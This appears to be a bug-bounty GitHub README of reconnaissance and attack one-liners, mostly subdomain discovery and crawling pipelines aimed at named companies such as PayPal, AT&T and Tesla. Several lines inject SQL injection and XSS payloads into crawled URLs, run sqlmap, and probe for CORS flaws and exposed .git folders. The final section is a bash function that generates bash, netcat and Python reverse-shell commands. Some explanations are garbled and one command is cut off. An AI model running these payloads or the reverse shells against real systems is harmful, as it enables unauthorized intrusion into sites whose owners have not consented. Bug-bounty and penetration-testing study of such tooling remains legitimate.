## 👑 What is KingOfOneLineTips Project ? 👑

Our main goal is to share tips from some well-known bughunters. Using recon methodology, we are able to find subdomains, apis, and tokens that are already exploitable, so we can report them. We wish to influence Onelinetips and explain the commands, for the better understanding of new hunters.

## Join Us
[![Telegram](https://patrolavia.github.io/telegram-badge/chat.png)](https://t.me/KingOfTipsBugBounty)

[![GitHub followers](https://img.shields.io/github/followers/bminossi.svg?style=social&label=Follow&maxAge=2592000)](https://github.com/bminossi?tab=followers) 
[![GitHub followers](https://img.shields.io/github/followers/OfJAAH.svg?style=social&label=Follow&maxAge=2592000)](https://github.com/OfJAAH?tab=followers)

## Special thanks

- [@Stokfredrik](https://twitter.com/stokfredrik)
- [@Jhaddix](https://twitter.com/Jhaddix)
- [@pdiscoveryio](https://twitter.com/pdiscoveryio)
- [@TomNomNom](https://twitter.com/TomNomNom)
- [@jeff_foley](https://twitter.com/@jeff_foley)
- [@NahamSec](https://twitter.com/NahamSec)
- [@j3ssiejjj](https://twitter.com/j3ssiejjj)

## Scripts that need to be installed

To run the project, you will need to install the following programs:

- [Amass](https://github.com/OWASP/Amass)
- [Anew](https://github.com/tomnomnom/anew)
- [Apktool](https://github.com/iBotPeaches/Apktool)
- [Chaos](https://github.com/projectdiscovery/chaos-client)
- [Ffuf](https://github.com/ffuf/ffuf)
- [Findomain](https://github.com/Edu4rdSHL/findomain)
- [Gargs](https://github.com/brentp/gargs)
- [Gf](https://github.com/tomnomnom/gf)
- [Github-Search](https://github.com/gwen001/github-search)
- [Gospider](https://github.com/jaeles-project/gospider)
- [Hakrawler](https://github.com/hakluke/hakrawler)
- [Httpx](https://github.com/projectdiscovery/httpx)
- [Jaeles](https://github.com/jaeles-project/jaeles)
- [Jq](https://github.com/stedolan/jq)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [Qsreplace](https://github.com/tomnomnom/qsreplace)
- [Rush](https://github.com/shenwei356/rush)
- [Shodan](https://github.com/achillean/shodan-python)
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Subjs](https://github.com/lc/subjs)
- [Unew](https://github.com/dwisiswant0/unew)


###  Search Asn Amass

- [Explaining command](https://bit.ly/2EMooDB)

Amass intel will search the organization "paypal" from a database of ASNs at a faster-than-default rate. It will then take these ASN numbers and scan the complete ASN/IP space for all tld's in that IP space (paypal.com, paypal.co.id, paypal.me).

```bash
amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''
```

###  Using chaos search js


- [Explaining command](https://bit.ly/32vfRg7)

Chaos is an API by Project Discovery that discovers subdomains. Here we are querying thier API for all known subdoains of "att.com". We are then using httpx to find which of those domains is live and hosts an HTTP or HTTPs site. We then pass those URLs to GoSpider to visit them and crawl them for all links (javascript, endpoints, etc). We then grep to find all the JS files. We pipe this all through anew so we see the output iterativlely (faster) and grep for "(http|https)://att.com" to make sure we dont recieve output for domains that are not "att.com".

```bash
chaos -d att.com | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/"].*.js+" | sed "s#]
```

###  Search Subdomain using Gospider


- [Explaining command](https://bit.ly/2QtG9do)

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) we use some blacklist, so that it doesn’t travel, not to delay, grep is a command-line utility for searching plain-text data sets for lines that match a regular expression to search HTTP and HTTPS

```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  Using gospider to chaos


- [Explaining command](https://bit.ly/2D4vW3W)

GoSpider to visit them and crawl them for all links (javascript, endpoints, etc) chaos is a subdomain search project, to use it needs the api, to xargs is a command on Unix and most Unix-like operating systems used to build and execute commands from standard input.


```bash
chaos -d paypal.com -bbq -filter-wildcard -http-url | xargs -I@ -P5 sh -c 'gospider -a -s "@" -d 3'
```

###  Using recon.dev and gospider crawler subdomains

- [Explaining command](https://bit.ly/32pPRDa)

We will use recon.dev api to extract ready subdomains infos, then parsing output json with jq, replacing with a Stream EDitor all blank spaces
If anew, we can sort and display unique domains on screen, redirecting this output list to httpx to create a new list with just alive domains.
Xargs is being used to deal with gospider with 3 parallel proccess and then using grep within regexp just taking http urls.

```bash
curl "https://recon.dev/api/search?key=apiKEY&domain=paypal.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -P3 -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

###  PSQL - search subdomain using cert.sh

- [Explaining command](https://bit.ly/32rMA6e)

Make use of pgsql cli of crt.sh, replace all comma to new lines and grep just twitch text domains with anew to confirm unique outputs

```bash
psql -A -F , -f querycrt -h http://crt.sh -p 5432 -U guest certwatch 2>/dev/null | tr ', ' '\n' | grep twitch | anew
```

###  Search subdomains using github and httpx

- [Github-search](https://github.com/gwen001/github-search)

Using python3 to search subdomains, httpx filter hosts by up status-code response (200)

```python
./github-subdomains.py -t APYKEYGITHUB -d domaintosearch | httpx --title
```

###  Search SQLINJECTION using qsreplace search syntax error

- [Explained command](https://bit.ly/3hxFWS2)

```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

###  Search subdomains using jldc

- [Explained command](https://bit.ly/2YBlEjm)

```bash
curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

###  Search subdomains in assetfinder using hakrawler spider to search links in content responses

- [Explained command](https://bit.ly/3hxRvZw)

```bash
assetfinder -subs-only tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"
```

###  Search subdomains in cert.sh

- [Explained command](https://bit.ly/2QrvMXl)

```bash
curl -s "https://crt.sh/?q=%25.att.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | httpx -title -silent | anew
```

###  Search subdomains in cert.sh assetfinder to search in link /.git/HEAD

- [Explained command](https://bit.ly/3lhFcTH)

```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
```bash
curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
###  Collect js files from hosts up by gospider

- [Explained command](https://bit.ly/3aWIwyI)

```bash
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```

###  Subdomain search Bufferover resolving domain to httpx

- [Explained command](https://bit.ly/3lno9j0)

```bash
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
```

###  Using gargs to gospider search with parallel proccess
- [Gargs](https://github.com/brentp/gargs)

- [Explained command](https://bit.ly/2EHj1FD)

```bash
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
```

###  Injection xss using qsreplace to urls filter to gospider

- [Explained command](https://bit.ly/3joryw9)

```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

###  Extract URL's to apk

- [Explained command](https://bit.ly/2QzXwJr)

```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```

###  Chaos to Gospider

- [Explained command](https://bit.ly/3gFJbpB)

```bash
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
```

###  Checking invalid certificate

- [Real script](https://bit.ly/2DhAwMo)
- [Script King](https://bit.ly/34Z0kIH)

```bash
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
```

###  Using shodan & Nuclei

- [Explained command](https://bit.ly/3jslKle)

Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column.
httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.

```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

###  Open Redirect test using gf.

- [Explained command](https://bit.ly/3hL263x)

echo is a command that outputs the strings it is being passed as arguments. What to Waybackurls? Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for .domain.com and output them on stdout. Httpx? is a fast and multi-purpose HTTP. GF? A wrapper around grep to avoid typing common patterns and anew Append lines from stdin to a file, but only if they don't already appear in the file. Outputs new lines to stdout too, removes duplicates.

```bash
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```

###  Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".

- [Explained command](https://bit.ly/2QQfY0l)

```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
```
###  Using Chaos to jaeles "How did I find a critical today?.

- [Explained command](https://bit.ly/2YXiK8N)

To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates. 

```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```

###  Using shodan to jaeles

- [Explained command](https://bit.ly/2Dkmycu)

```bash
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
```

###  Search to files using assetfinder and ffuf

- [Explained command](https://bit.ly/2Go3Ba4)

```bash
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```

###  HTTPX using new mode location and injection XSS using qsreplace.

- [Explained command](https://bit.ly/2Go3Ba4)

```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
```

###  Grab internal juicy paths and do requests to them.

- [Explained command](https://bit.ly/357b1IY)

```bash
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
```

###  Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.

- [Explained command](https://bit.ly/2R2gNn5)

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

###  Using to findomain to SQLINJECTION.

- [Explained command](https://bit.ly/2ZeAhcF)

```bash
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```

###  Jaeles scan to bugbounty targets.

- [Explained command](https://bit.ly/3jXbTnU)

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```

###  JLDC domain search subdomain, using rush and jaeles.

- [Explained command](https://bit.ly/3hfNV5k)

```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```

###  Chaos to search subdomains check cloudflareip scan port.

- [Explained command](https://bit.ly/3hfNV5k)

```bash
chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
```
###  Search JS to domains file.

- [Explained command](https://bit.ly/2Zs13yj)

```bash
cat FILE TO TARGET | httpx -silent | subjs | anew
```

###  Search JS using assetfinder, rush and hakrawler.

- [Explained command](https://bit.ly/3ioYuV0)

```bash
assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
```

###  Search to CORS using assetfinder and rush

- [Explained command](https://bit.ly/33qT71x)

```bash
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null"
```

###  Search to js using hakrawler and rush & unew

- [Explained command](https://bit.ly/2Rqn9gn)

```bash
tac hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
```

###  Common Reverse Shell Alias
- [How To Install](https://github.com/ryanrohypnol/Reverse-Shell-Bash-Alias)
```bash
function reverse { local port=443;adaptors=$(ip a | egrep ^[0-9]+ | cut -d" " -f 2 | sed 's/://g');OPTIND=1;usage()( echo "reverse [-i <interface>] [-l <language>] [-p <port>]";printf "Language Options:\n  bash\n  nc\n  python\n\n" );while getopts ":i:l:p:h" options; do case "${options}" in i)local interface=${OPTARG};if ! echo $interface |  egrep -qo "public"; then if ! echo $adaptors | grep -qo "$interface"; then echo "Interface "${OPTARG}" does not exist";usage;return;fi;fi;;l)local language=${OPTARG};;     p)local port=${OPTARG};;h)usage;return;;:)echo "Error: -${OPTARG} requires an argument";usage;return;;*)echo "Unknown Switch: -${OPTARG}";usage;return;;esac;done;if [ -z $interface ]; then if ip a | egrep -qo "tun0"; then local interface="tun0";elif echo $interface | egrep -qo "public" ; then local interface="public";elif ip a | egrep -qo "eth0"; then local interface="eth0";elif ip a | egrep -qo "ens33"; then local interface="ens33";else local interface="lo";fi;fi;if echo $interface | egrep -qo "public"; then local ip=$(wget -qO - icanhazip.com);else local ip=$(ip a show $interface | egrep -o "([0-9]{1,3}\.){3}[0-9]{1,3}" | head -1);fi;local randName=$(head -4 /dev/urandom | sha256sum | base64 | head -c 5);declare -A shells=( ["bash"]="bash -i >& /dev/tcp/$ip/$port 0>&1" ["nc"]="mkfifo /tmp/$randName; nc $ip $port 0</tmp/$randName | /bin/sh >/tmp/$randName 2>&1; rm /tmp/$randName" ["python"]="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'" );if [ -z $language ]; then printf "\n";for i in "${shells[@]}";do printf "$i\n\n";done;return;fi;printf "\n${shells[$language]}\n\n"; }
```

# Project

[![made-with-Go](https://img.shields.io/badge/Made%20with-Go-1f425f.svg)](http://golang.org)
[![made-with-bash](https://img.shields.io/badge/Made%20with-Bash-1f425f.svg)](https://www.gnu.org/software/bash/)
[![Open Source? Yes!](https://badgen.net/badge/Open%20Source%20%3F/Yes%21/blue?icon=github)](https://github.com/Naereen/badges/)
[![The King](https://aleen42.github.io/badges/src/twitter.svg)](https://twitter.com/ofjaaah)
[![The King](https://aleen42.github.io/badges/src/twitter.svg)](https://twitter.com/zeroc00I)
[![The King](https://aleen42.github.io/badges/src/twitter.svg)](https://twitter.com/willxenoo)
[![Telegram](https://patrolavia.github.io/telegram-badge/chat.png)](https://t.me/KingOfTipsBugBounty)



<a href="https://www.buymeacoffee.com/OFJAAAH" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 20px !important;width: 50px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
